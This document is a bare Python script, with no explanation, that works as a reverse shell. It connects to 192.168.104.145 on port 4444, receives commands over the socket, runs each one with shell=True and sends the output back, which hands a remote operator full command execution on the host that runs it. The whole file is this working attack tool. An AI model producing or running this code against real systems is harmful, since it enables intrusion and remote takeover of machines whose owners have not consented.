from socket import *
import subprocess
s=socket(AF_INET,SOCK_STREAM)

s.connect(("192.168.104.145",4444))

while True:
    data=s.recv(12345)
    cmd=subprocess.check_output(data.decode(),shell=True)
    s.sendall(cmd)
    
s.close()
